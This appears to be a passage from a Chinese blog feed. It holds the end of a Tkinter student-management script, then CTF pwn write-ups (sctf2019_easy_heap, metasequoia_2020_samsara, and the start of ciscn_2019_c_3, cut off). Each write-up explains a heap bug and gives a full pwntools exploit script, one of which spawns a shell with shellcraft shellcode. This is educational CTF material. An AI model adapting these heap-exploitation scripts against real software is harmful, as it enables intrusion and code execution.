tk.Label(dialog, text=<span class="string">"性别："</span>).grid(row=<span class="number">3</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">        gender_var = tk.StringVar(value=student[<span class="string">'gender'</span>])</span><br><span class="line">        gender_menu = tk.OptionMenu(dialog, gender_var, <span class="string">"男"</span>, <span class="string">"女"</span>)</span><br><span class="line">        gender_menu.grid(row=<span class="number">3</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">edit_student_action</span>():</span><br><span class="line">            student[<span class="string">'name'</span>] = name_var.get()</span><br><span class="line">            student[<span class="string">'age'</span>] = <span class="built_in">int</span>(age_var.get())</span><br><span class="line">            student[<span class="string">'gender'</span>] = gender_var.get()</span><br><span class="line">            messagebox.showinfo(<span class="string">"成功"</span>, <span class="string">"学生信息编辑成功！"</span>)</span><br><span class="line">            dialog.destroy()</span><br><span class="line"></span><br><span class="line">        edit_button = tk.Button(dialog, text=<span class="string">"编辑"</span>, command=edit_student_action)</span><br><span class="line">        edit_button.grid(row=<span class="number">4</span>, columnspan=<span class="number">2</span>, pady=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showerror(<span class="string">"错误"</span>, <span class="string">"未找到该学生信息。"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_student</span>(<span class="params">students</span>):</span><br><span class="line">    student_id = simpledialog.askstring(<span class="string">"输入"</span>, <span class="string">"请输入要删除的学号："</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> student_id <span class="keyword">or</span> <span class="keyword">not</span> validate_id(student_id):</span><br><span class="line">        messagebox.showerror(<span class="string">"错误"</span>, <span class="string">"学号格式错误，请重新输入。"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    student = <span class="built_in">next</span>((s <span class="keyword">for</span> s <span class="keyword">in</span> students <span class="keyword">if</span> s[<span class="string">'id'</span>] == student_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> student:</span><br><span class="line">        students.remove(student)</span><br><span class="line">        messagebox.showinfo(<span class="string">"成功"</span>, <span class="string">"学生信息删除成功！"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showerror(<span class="string">"错误"</span>, <span class="string">"未找到该学生信息。"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    root.title(<span class="string">"学生信息管理系统"</span>)</span><br><span class="line"></span><br><span class="line">    students = load_students()</span><br><span class="line"></span><br><span class="line">    window_width = <span class="number">800</span></span><br><span class="line">    window_height = <span class="number">500</span></span><br><span class="line">    screen_width = root.winfo_screenwidth()</span><br><span class="line">    screen_height = root.winfo_screenheight()</span><br><span class="line"></span><br><span class="line">    x_position = (screen_width - window_width) // <span class="number">2</span></span><br><span class="line">    y_position = (screen_height - window_height) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    root.geometry(<span class="string">f"<span class="subst">{window_width}</span>x<span class="subst">{window_height}</span>+<span class="subst">{x_position}</span>+<span class="subst">{y_position}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_students_command</span>():</span><br><span class="line">        students_text = show_students(students)</span><br><span class="line">        messagebox.showinfo(<span class="string">"学生信息"</span>, students_text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_student_command</span>():</span><br><span class="line">        add_student(students)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete_student_command</span>():</span><br><span class="line">        delete_student(students)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit_student_command</span>():</span><br><span class="line">        edit_student(students)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_and_exit</span>():</span><br><span class="line">        save_students(students)</span><br><span class="line">        root.destroy()</span><br><span class="line"></span><br><span class="line">    show_students_button = tk.Button(root, text=<span class="string">"显示所有学生信息"</span>, command=show_students_command)</span><br><span class="line">    show_students_button.pack()</span><br><span class="line"></span><br><span class="line">    add_student_button = tk.Button(root, text=<span class="string">"添加学生信息"</span>, command=add_student_command)</span><br><span class="line">    add_student_button.pack()</span><br><span class="line"></span><br><span class="line">    delete_student_button = tk.Button(root, text=<span class="string">"删除学生信息"</span>, command=delete_student_command)</span><br><span class="line">    delete_student_button.pack()</span><br><span class="line"></span><br><span class="line">    edit_student_button = tk.Button(root, text=<span class="string">"编辑学生信息"</span>, command=edit_student_command)</span><br><span class="line">    edit_student_button.pack()</span><br><span class="line"></span><br><span class="line">    exit_button = tk.Button(root, text=<span class="string">"保存并退出"</span>, command=save_and_exit)</span><br><span class="line">    exit_button.pack()</span><br><span class="line"></span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sctf2019_easy_heap</title>
      <link href="//posts/b5a0cf5/"/>
      <url>//posts/b5a0cf5/</url>
      
        <content type="html"><![CDATA[<h5 id="例行检查，保护全开"><a href="#例行检查，保护全开" class="headerlink" title="例行检查，保护全开"></a>例行检查，保护全开</h5><h5 id="调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用"><a href="#调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用" class="headerlink" title="调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用"></a>调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nFPj.png" alt="image-20231204213036915"></p><h5 id="add函数-会打印出堆的地址"><a href="#add函数-会打印出堆的地址" class="headerlink" title="add函数,会打印出堆的地址"></a>add函数,会打印出堆的地址</h5><p><img src="https://i.imgs.ovh/2023/12/04/3np8e.png" alt="image-20231204213219796"></p><h5 id="full函数，能输入内容到堆上"><a href="#full函数，能输入内容到堆上" class="headerlink" title="full函数，能输入内容到堆上"></a>full函数，能输入内容到堆上</h5><p><img src="https://i.imgs.ovh/2023/12/04/3n3A3.png" alt="image-20231204213548121"></p><h5 id="最后会增添一个’-x00’-存在off-by-one-漏洞"><a href="#最后会增添一个’-x00’-存在off-by-one-漏洞" class="headerlink" title="最后会增添一个’\x00’,存在off by one 漏洞"></a>最后会增添一个’\x00’,存在off by one 漏洞</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nfs9.png" alt="image-20231204213619003"></p><h5 id="free函数，没什么漏洞"><a href="#free函数，没什么漏洞" class="headerlink" title="free函数，没什么漏洞"></a>free函数，没什么漏洞</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nWVH.png" alt="image-20231204213731793"></p><h5 id="先接收mmap映射的地址"><a href="#先接收mmap映射的地址" class="headerlink" title="先接收mmap映射的地址"></a>先接收mmap映射的地址</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b'Mmap: '</span>)</span><br><span class="line">vmap = p.recvline().strip()</span><br><span class="line">vmap = <span class="built_in">int</span>(vmap, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'vmap=&gt;'</span>+<span class="built_in">hex</span>(vmap))</span><br></pre></td></tr></tbody></table></figure><h5 id="做off-by-one这种题的话，有个技巧，一般都是先申请四个堆"><a href="#做off-by-one这种题的话，有个技巧，一般都是先申请四个堆" class="headerlink" title="做off-by-one这种题的话，有个技巧，一般都是先申请四个堆"></a>做off-by-one这种题的话，有个技巧，一般都是先申请四个堆</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#3</span></span><br></pre></td></tr></tbody></table></figure><h5 id="然后释放第一个，然后填充第一个堆，利用sub-E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间"><a href="#然后释放第一个，然后填充第一个堆，利用sub-E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间" class="headerlink" title="然后释放第一个，然后填充第一个堆，利用sub_E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间"></a>然后释放第一个，然后填充第一个堆，利用sub_E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x490</span>)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/12/04/3HLO5.png" alt="image-20231204220708856"></p><h5 id="释放堆2，会进行unlink"><a href="#释放堆2，会进行unlink" class="headerlink" title="释放堆2，会进行unlink"></a>释放堆2，会进行unlink</h5><p><img src="https://i.imgs.ovh/2023/12/04/3H2lX.png" alt="image-20231204220956361"></p><h5 id="再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合"><a href="#再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合" class="headerlink" title="再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合"></a>再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合</h5><p><img src="https://i.imgs.ovh/2023/12/04/3H6lu.png" alt="image-20231204223334972"></p><h5 id="再delete几次，相当于double-free了堆2"><a href="#再delete几次，相当于double-free了堆2" class="headerlink" title="再delete几次，相当于double free了堆2"></a>再delete几次，相当于double free了堆2</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#1=&gt;#3 </span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#2(1)=&gt;1</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/12/04/3H3Qp.png" alt="image-20231204223004490"></p><h5 id="接下来改bin链指针成改成vmap的，写上shellcode"><a href="#接下来改bin链指针成改成vmap的，写上shellcode" class="headerlink" title="接下来改bin链指针成改成vmap的，写上shellcode"></a>接下来改bin链指针成改成vmap的，写上shellcode</h5><p><img src="https://i.imgs.ovh/2023/12/06/3gchT.png" alt="image-20231206200052135"></p><h5 id="上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main-arena-96的地址。"><a href="#上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main-arena-96的地址。" class="headerlink" title="上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main_arena+96的地址。"></a>上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main_arena+96的地址。</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fill(<span class="number">1</span>,payload) </span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment"># 0</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/12/09/feBe9.png" alt="image-20231209222142417"></p><h5 id="fill堆2一个字节，将其改为0x30，既是mallloc-hook的地址"><a href="#fill堆2一个字节，将其改为0x30，既是mallloc-hook的地址" class="headerlink" title="fill堆2一个字节，将其改为0x30，既是mallloc_hook的地址"></a>fill堆2一个字节，将其改为0x30，既是mallloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/12/09/feIGO.png" alt="image-20231209222512116"></p><h5 id="再malloc0x68两次，第二次写上vmap的地址-再任意申请一次堆即可提权"><a href="#再malloc0x68两次，第二次写上vmap的地址-再任意申请一次堆即可提权" class="headerlink" title="再malloc0x68两次，第二次写上vmap的地址,再任意申请一次堆即可提权"></a>再malloc0x68两次，第二次写上vmap的地址,再任意申请一次堆即可提权</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">fill(<span class="number">1</span>,p64(vmap)) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#4</span></span><br><span class="line">fill(<span class="number">4</span>,p64(vmap))</span><br><span class="line">add(<span class="number">0x20</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",28038)</span></span><br><span class="line">p=process(<span class="string">"./sctf2019_easy_heap"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#context=arch('amd64')</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b'Mmap: '</span>)</span><br><span class="line">vmap = p.recvline().strip()</span><br><span class="line">vmap = <span class="built_in">int</span>(vmap, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'vmap=&gt;'</span>+<span class="built_in">hex</span>(vmap))</span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x490</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)  <span class="comment">#2 lead to chunk1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#1=&gt;3</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#1=&gt;1 in the similar case we use by UAF,but it is not.</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">1</span>,p64(vmap))</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">fill(<span class="number">3</span>,shellcode)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#free 0x410</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">1</span>,payload) </span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment"># 0</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">fill(<span class="number">2</span>,<span class="string">'\x30'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">fill(<span class="number">1</span>,p64(vmap)) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#4</span></span><br><span class="line">fill(<span class="number">4</span>,p64(vmap))</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>metasequoia_2020_samsara</title>
      <link href="//posts/dff3306c/"/>
      <url>//posts/dff3306c/</url>
      
        <content type="html"><![CDATA[<h5 id="保护全开，就不放了"><a href="#保护全开，就不放了" class="headerlink" title="保护全开，就不放了"></a>保护全开，就不放了</h5><h5 id="程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag"><a href="#程序挺简单的，菜单直接放出来了，存在double-free漏洞，只需要让v8-0xdeadbeef就能拿到flag" class="headerlink" title="程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag"></a>程序挺简单的，菜单直接放出来了，存在double free漏洞，只需要让v8=0xdeadbeef就能拿到flag</h5><p><img src="https://i.imgs.ovh/2023/12/03/wSene.png" alt=""></p><h5 id="先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef"><a href="#先double-free-然后用case4打印出v7的地址，在栈上v8的地址等于v7-0x8-double-free改地址的时候改到v7-0x8-然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8-0x10的地方写上0xdeadbeef" class="headerlink" title="先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef"></a>先double free,然后用case4打印出v7的地址，在栈上v8的地址等于v7+0x8,double free改地址的时候改到v7-0x8,然后v7的值得是0x20，构造fakechunk，然后malloc的时候在v7-0x8+0x10的地方写上0xdeadbeef</h5><p><img src="https://i.imgs.ovh/2023/12/03/wukUH.png" alt="image-20231203164238201"></p><p><img src="https://i.imgs.ovh/2023/12/03/wu1MT.png" alt="image-20231203165112607"></p><h5 id="开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意"><a href="#开始的时候得多申请一个堆堆3，其他师傅说防止free-掉的两个chunk和top-chunk合并，脚本跑的话没逝，但以后还是得注意" class="headerlink" title="开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意"></a>开始的时候得多申请一个堆堆3，其他师傅说防止free 掉的两个chunk和top chunk合并，脚本跑的话没逝，但以后还是得注意</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",28766)</span></span><br><span class="line">p=process(<span class="string">"./metasequoia_2020_samsara"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">'choice &gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'choice &gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">full</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'choice &gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index'</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Ingredient:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">'choice &gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'choice &gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Which kingdom?'</span>,content)</span><br><span class="line"></span><br><span class="line">add() <span class="comment">#0</span></span><br><span class="line">add() <span class="comment">#1</span></span><br><span class="line">add() <span class="comment">#2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your lair is at: '</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#addr = int(p.recvuntil('\n', drop=True), 16)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'addr=&gt;'</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">move(<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v8=addr-<span class="number">0x8</span></span><br><span class="line">add() <span class="comment">#3</span></span><br><span class="line">full(<span class="number">3</span>,<span class="built_in">str</span>(v8))</span><br><span class="line">add() <span class="comment">#4</span></span><br><span class="line">add() <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">add() <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">full(<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice &gt; '</span>,<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_c_3</title>
      <link href="//posts/7d6af77/"/>
      <url>//posts/7d6af77/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgs.ovh/2023/11/27/pnlWA.png" alt="image-20231127212242738"></p><h5 id="开启了全局偏移"><a href="#开启了全局偏移" class="headerlink" title="开启了全局偏移"></a>开启了全局偏移</h5><h5 id="add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数"><a href="#add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数" class="headerlink" title="add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数"></a>add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnne5.png" alt="image-20231127212332956"></p><h5 id="show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址"><a href="#show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址" class="headerlink" title="show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址"></a>show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnhGT.png" alt="image-20231127213053713"></p><h5 id="delete函数，存在很明显的UAF漏洞"><a href="#delete函数，存在很明显的UAF漏洞" class="headerlink" title="delete函数，存在很明显的UAF漏洞"></a>delete函数，存在很明显的UAF漏洞</h5><p><img 